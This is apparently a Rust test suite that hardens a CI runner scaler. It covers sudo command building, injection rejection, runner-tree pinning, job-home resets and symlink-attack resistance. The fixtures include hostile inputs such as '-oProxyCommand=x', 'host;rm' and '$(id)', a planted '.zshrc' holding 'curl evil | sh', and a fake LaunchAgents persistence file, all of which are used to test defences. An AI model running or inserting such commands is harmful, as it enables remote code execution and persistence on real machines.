#![allow(clippy::unwrap_used, clippy::expect_used)]
use carrick_xtask::ci_scaler::*;
use std::os::unix::fs::PermissionsExt;

fn job(id: u64) -> JobKey {
    JobKey {
        run: RunId(10),
        attempt: 1,
        job: JobId(id),
    }
}

#[test]
fn mac_ledger_serves_one_runner_and_each_job_attempt_once() {
    let mut ledger = MacLedger::default();
    let mut row = ledger.reserve(job(1), 100).unwrap();
    assert_eq!(row.name, "carrick-hvf-10-1-1-100");
    assert_eq!(row.state, MacState::Registering);
    assert!(ledger.reserve(job(2), 101).is_err(), "one runner at a time");
    row.state = MacState::Done;
    row.assigned = Some(JobId(1));
    ledger.rows[0] = row;
    assert!(ledger.reserve(job(1), 102).is_err(), "job key deduplicated");
    let restored: MacLedger =
        serde_json::from_slice(&serde_json::to_vec(&ledger).unwrap()).unwrap();
    let mut restored = restored;
    assert!(restored.reserve(job(2), 103).is_ok());
}

#[test]
fn mac_ledger_re_serves_a_job_whose_runner_never_ran_it() {
    let mut ledger = MacLedger::default();
    let row = ledger.reserve(job(1), 100).unwrap();
    // Launch failed or the runner was drained/killed: closed without the job.
    ledger.rows[0].state = MacState::Done;
    assert!(ledger.reserve(job(1), 101).is_ok());
    assert_ne!(ledger.rows[1].name, row.name);
}

fn launched(created: u64) -> MacRecord {
    let mut row = MacLedger::default().reserve(job(1), created).unwrap();
    row.state = MacState::Launched;
    row.runner = Some(RunnerId(7));
    row
}

#[test]
fn mac_step_never_removes_a_busy_runner_and_drains_only_after_the_deadline() {
    let row = launched(1000);
    for done in [false, true] {
        assert_eq!(
            mac_step(&row, Assignment::Busy, done, 99_999),
            MacStep::Wait
        );
    }
    assert_eq!(
        mac_step(&row, Assignment::Unassigned, false, 1000 + 899),
        MacStep::Wait
    );
    assert_eq!(
        mac_step(&row, Assignment::Unassigned, false, 1000 + 900),
        MacStep::Drain
    );
    // Runner process gone without a job: rejected and killed, or failed.
    assert_eq!(
        mac_step(&row, Assignment::Unassigned, true, 1001),
        MacStep::Remove
    );
    // Completed: let the ephemeral runner exit before removing it.
    assert_eq!(
        mac_step(&row, Assignment::Completed, false, 1001),
        MacStep::Wait
    );
    assert_eq!(
        mac_step(&row, Assignment::Completed, true, 1001),
        MacStep::Remove
    );
    assert_eq!(
        mac_step(&row, Assignment::Unknown, false, 99_999),
        MacStep::Wait
    );
    let mut interrupted = row.clone();
    interrupted.state = MacState::Registering;
    assert_eq!(
        mac_step(&interrupted, Assignment::Unknown, true, 1001),
        MacStep::Remove
    );
    let mut draining = row;
    draining.state = MacState::Draining;
    assert_eq!(
        mac_step(&draining, Assignment::Unassigned, false, 1001),
        MacStep::Drain
    );
}

#[test]
fn mac_target_sudo_command_carries_only_the_binding_and_pin() {
    let pin = "a".repeat(64);
    let target = MacTarget::new(
        "rentamac@cloudmac".into(),
        "/Volumes/carrick-build/carrick-ci/bin/carrick-xtask".into(),
        pin.clone(),
    )
    .unwrap();
    let command = target.run_once_command("carrick-hvf-10-1-1-100", &binding());
    assert!(command.starts_with(
        "sudo -n '/Volumes/carrick-build/carrick-ci/bin/carrick-xtask' ci-scaler mac-run-once"
    ));
    assert!(command.contains(&format!(
        "--run-id 10 --run-attempt 1 --sha '{}'",
        "f".repeat(40)
    )));
    assert!(command.ends_with(&pin));
    assert!(!command.contains("jit"));
    assert!(
        target
            .quiesce_command("carrick-hvf-10-1-1-100")
            .starts_with("sudo -n ")
    );
    assert!(MacTarget::new("h".into(), "/a/b".into(), "short".into()).is_err());
}

#[test]
fn mac_target_rejects_option_and_shell_injection() {
    let ok = |host: &str, xtask: &str, _unused: &str| {
        MacTarget::new(host.into(), xtask.into(), "a".repeat(64)).is_ok()
    };
    assert!(ok(
        "rentamac@cloudmac",
        "/Volumes/carrick-build/carrick-ci/bin/carrick-xtask",
        "/Volumes/carrick-build/carrick-ci/run"
    ));
    assert!(!ok("-oProxyCommand=x", "/a/b", "/a/c"));
    assert!(!ok("host;rm", "/a/b", "/a/c"));
    assert!(!ok("host", "relative/xtask", "/a/c"));
    assert!(!ok("host", "/a/b c", "/a/c"));
    assert!(!ok("host", "/a/../b", "/a/c"));
    assert!(!ok("host", "/a/$(id)", "/a/c"));
}

fn binding() -> RunBinding {
    RunBinding {
        run: RunId(10),
        attempt: 1,
        sha: "f".repeat(40),
    }
}

/// A state root and hook executable owned by the test user, standing in for
/// root ownership (production passes owner 0).
fn fixture() -> (tempfile::TempDir, std::path::PathBuf, u32) {
    let root = tempfile::tempdir().unwrap();
    std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
    let exe = root.path().join("xtask");
    std::fs::write(&exe, "#!/bin/sh\n").unwrap();
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    let state_root = root.path().join("run");
    std::fs::create_dir(&state_root).unwrap();
    std::fs::set_permissions(&state_root, std::fs::Permissions::from_mode(0o755)).unwrap();
    (root, exe, unsafe { libc::geteuid() })
}

#[test]
fn run_once_state_is_one_use_and_bound_to_the_vetted_run() {
    let (root, exe, uid) = fixture();
    let state_root = root.path().join("run");
    let name = "carrick-hvf-10-1-1-100";
    let state = prepare_run_once(name, &exe, &state_root, &binding(), uid, uid).unwrap();
    assert_eq!(
        read_policy(&state.join("policy"), Some(uid)).unwrap(),
        JobPolicy::Bound(binding())
    );
    let mode = |file: &str| {
        std::fs::metadata(state.join(file))
            .unwrap()
            .permissions()
            .mode()
            & 0o777
    };
    assert_eq!(mode("policy"), 0o644);
    assert_eq!(mode("admit-job.sh"), 0o755);
    assert_eq!(mode("admission.lock"), 0o600);
    let hook = std::fs::read_to_string(state.join("admit-job.sh")).unwrap();
    assert!(hook.contains("ci-scaler admit-job --policy-file"));
    assert!(hook.contains("exec /bin/kill -KILL 0"));
    assert!(!hook.contains("/usr/local/bin/carrick-xtask"));
    // Replaying a name loses at mkdir.
    assert!(prepare_run_once(name, &exe, &state_root, &binding(), uid, uid).is_err());
    // Only mac-jit names; never a path.
    for bad in [
        "../etc",
        "carrick-hvf-",
        "carrick-hvf-1/2",
        "carrick-ci-1-1-1-1",
    ] {
        assert!(
            prepare_run_once(bad, &exe, &state_root, &binding(), uid, uid).is_err(),
            "{bad}"
        );
    }
    let mut short = binding();
    short.sha = "short".into();
    assert!(prepare_run_once("carrick-hvf-1-1-1-9", &exe, &state_root, &short, uid, uid).is_err());
}

#[test]
fn run_once_refuses_a_job_writable_hook_binary_or_state_root() {
    let (root, exe, uid) = fixture();
    let state_root = root.path().join("run");
    // The hook xtask must belong to the policy owner (root in production).
    assert!(
        prepare_run_once(
            "carrick-hvf-1-1-1-1",
            &exe,
            &state_root,
            &binding(),
            uid.wrapping_add(1),
            uid
        )
        .is_err()
    );
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o775)).unwrap();
    assert!(
        prepare_run_once(
            "carrick-hvf-1-1-1-2",
            &exe,
            &state_root,
            &binding(),
            uid,
            uid
        )
        .is_err()
    );
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::set_permissions(&state_root, std::fs::Permissions::from_mode(0o777)).unwrap();
    assert!(
        prepare_run_once(
            "carrick-hvf-1-1-1-3",
            &exe,
            &state_root,
            &binding(),
            uid,
            uid
        )
        .is_err()
    );
}

fn sha256_hex(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    format!("{:x}", Sha256::digest(bytes))
}

#[test]
fn runner_tree_must_match_the_pinned_manifest_before_every_launch() {
    let tree = tempfile::tempdir().unwrap();
    let uid = unsafe { libc::geteuid() };
    let dir = tree.path().join("actions-runner");
    std::fs::create_dir_all(dir.join("bin")).unwrap();
    std::fs::create_dir_all(dir.join("_work/job")).unwrap();
    std::fs::create_dir_all(dir.join("_diag")).unwrap();
    std::fs::write(dir.join("run.sh"), "#!/bin/sh\n").unwrap();
    std::fs::write(dir.join("bin/Runner.Listener"), "listener").unwrap();
    std::os::unix::fs::symlink("Runner.Listener", dir.join("bin/listener")).unwrap();
    for path in [dir.clone(), dir.join("bin")] {
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    for file in ["run.sh", "bin/Runner.Listener"] {
        std::fs::set_permissions(dir.join(file), std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let manifest_text = runner_manifest_for(&dir, Some(uid)).unwrap();
    assert!(manifest_text.contains("link Runner.Listener bin/listener"));
    assert!(
        !manifest_text.contains("_work"),
        "runner-writable dirs are excluded"
    );
    let manifest = tree.path().join("runner-manifest.txt");
    std::fs::write(&manifest, &manifest_text).unwrap();
    std::fs::set_permissions(&manifest, std::fs::Permissions::from_mode(0o644)).unwrap();
    let pin = sha256_hex(manifest_text.as_bytes());
    verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
    // Job output in _work does not matter.
    std::fs::write(dir.join("_work/job/out"), "x").unwrap();
    verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
    // A different pin, a modified file, a mode change, an extra file: refused.
    assert!(verify_runner_tree(&dir, &manifest, &"0".repeat(64), Some(uid)).is_err());
    std::fs::write(dir.join("run.sh"), "#!/bin/sh\nexit 0\n").unwrap();
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
    std::fs::write(dir.join("run.sh"), "#!/bin/sh\n").unwrap();
    verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
    std::fs::set_permissions(dir.join("run.sh"), std::fs::Permissions::from_mode(0o775)).unwrap();
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
    std::fs::set_permissions(dir.join("run.sh"), std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::write(dir.join("bin/extra"), "x").unwrap();
    std::fs::set_permissions(
        dir.join("bin/extra"),
        std::fs::Permissions::from_mode(0o644),
    )
    .unwrap();
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
    std::fs::remove_file(dir.join("bin/extra")).unwrap();
    // Another owner (root in production) is refused.
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid.wrapping_add(1))).is_err());
}

#[test]
fn scheduler_deny_lists_must_name_the_runner_account_exactly() {
    assert!(denies_user("root\ncarrick-ci\n", "carrick-ci"));
    assert!(denies_user("  carrick-ci  \n", "carrick-ci"));
    assert!(!denies_user(
        "carrick-ci-other\n# carrick-ci\n",
        "carrick-ci"
    ));
    assert!(!denies_user("", "carrick-ci"));
}

#[test]
fn job_home_and_work_are_recreated_from_the_skeleton_before_every_job() {
    let root = tempfile::tempdir().unwrap();
    let uid = unsafe { libc::geteuid() };
    let gid = unsafe { libc::getegid() };
    let skel = root.path().join("skel");
    std::fs::create_dir_all(skel.join(".config")).unwrap();
    std::fs::write(skel.join(".zshrc"), "export SKEL=1\n").unwrap();
    std::fs::write(skel.join(".config/git"), "[core]\n").unwrap();
    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o755)).unwrap();
    let home = root.path().join("home");
    let work = root.path().join("_work");
    let diag = root.path().join("_diag");
    // A previous job left persistence and caches behind.
    std::fs::create_dir_all(home.join("Library/LaunchAgents")).unwrap();
    std::fs::write(home.join("Library/LaunchAgents/evil.plist"), "x").unwrap();
    std::fs::write(home.join(".zshrc"), "curl evil | sh\n").unwrap();
    std::fs::create_dir_all(work.join("old/target")).unwrap();
    std::fs::write(work.join("old/target/cache"), "x").unwrap();
    // A symlink planted in place of a work dir is removed, never followed.
    let outside = root.path().join("outside");
    std::fs::create_dir(&outside).unwrap();
    std::fs::write(outside.join("keep"), "x").unwrap();
    std::os::unix::fs::symlink(&outside, &diag).unwrap();
    reset_job_area(&skel, &home, &[work.clone(), diag.clone()], uid, uid, gid).unwrap();
    assert_eq!(
        std::fs::read_to_string(home.join(".zshrc")).unwrap(),
        "export SKEL=1\n"
    );
    assert!(home.join(".config/git").is_file());
    assert!(!home.join("Library").exists());
    assert_eq!(std::fs::read_dir(&work).unwrap().count(), 0);
    assert!(std::fs::symlink_metadata(&diag).unwrap().is_dir());
    assert!(outside.join("keep").exists(), "symlink target untouched");
    // A skeleton the runner account could write is refused.
    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o777)).unwrap();
    assert!(reset_job_area(&skel, &home, &[], uid, uid, gid).is_err());
}

#[test]
fn toolchain_must_be_owner_only() {
    let root = tempfile::tempdir().unwrap();
    let uid = unsafe { libc::geteuid() };
    let tool = root.path().join("toolchain");
    std::fs::create_dir_all(tool.join("rustup")).unwrap();
    std::fs::create_dir_all(tool.join("cargo/bin")).unwrap();
    for dir in [tool.clone(), tool.join("rustup"), tool.join("cargo/bin")] {
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    verify_toolchain(&tool, uid).unwrap();
    assert!(verify_toolchain(&tool, uid.wrapping_add(1)).is_err());
    std::fs::set_permissions(
        tool.join("cargo/bin"),
        std::fs::Permissions::from_mode(0o777),
    )
    .unwrap();
    assert!(verify_toolchain(&tool, uid).is_err());
}

#[test]
fn reset_never_writes_through_a_symlink_planted_in_the_job_home() {
    let root = tempfile::tempdir().unwrap();
    std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
    let uid = unsafe { libc::geteuid() };
    let gid = unsafe { libc::getegid() };
    let skel = root.path().join("skel");
    std::fs::create_dir_all(skel.join(".ssh")).unwrap();
    std::fs::write(skel.join(".zshrc"), "export SKEL=1\n").unwrap();
    std::fs::write(skel.join(".ssh/config"), "Host *\n").unwrap();
    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o755)).unwrap();
    // Stand-ins for /etc/sudoers.d/x and a root-owned directory.
    let outside = root.path().join("outside");
    std::fs::create_dir(&outside).unwrap();
    std::fs::write(outside.join("sudoers"), "original\n").unwrap();
    let home = root.path().join("home");
    std::fs::create_dir(&home).unwrap();
    std::os::unix::fs::symlink(outside.join("sudoers"), home.join(".zshrc")).unwrap();
    std::os::unix::fs::symlink(&outside, home.join(".ssh")).unwrap();
    // Also pre-plant the temporary build name as a symlink to a directory.
    std::os::unix::fs::symlink(&outside, root.path().join(".home.new")).unwrap();
    reset_job_area(&skel, &home, &[], uid, uid, gid).unwrap();
    assert_eq!(
        std::fs::read_to_string(outside.join("sudoers")).unwrap(),
        "original\n",
        "a root write went through a planted symlink"
    );
    assert_eq!(
        std::fs::read_dir(&outside).unwrap().count(),
        1,
        "nothing was created in the symlink target"
    );
    let zshrc = std::fs::symlink_metadata(home.join(".zshrc")).unwrap();
    assert!(zshrc.is_file());
    assert_eq!(
        std::fs::read_to_string(home.join(".zshrc")).unwrap(),
        "export SKEL=1\n"
    );
    assert!(
        std::fs::symlink_metadata(home.join(".ssh"))
            .unwrap()
            .is_dir()
    );
    assert!(!root.path().join(".home.new").exists());
    assert!(!root.path().join(".home.old").exists());
    // The home itself replaced by a symlink is swapped out, not followed.
    std::fs::remove_dir_all(&home).unwrap();
    std::os::unix::fs::symlink(&outside, &home).unwrap();
    reset_job_area(&skel, &home, &[], uid, uid, gid).unwrap();
    assert!(std::fs::symlink_metadata(&home).unwrap().is_dir());
    assert_eq!(std::fs::read_dir(&outside).unwrap().count(), 1);
}
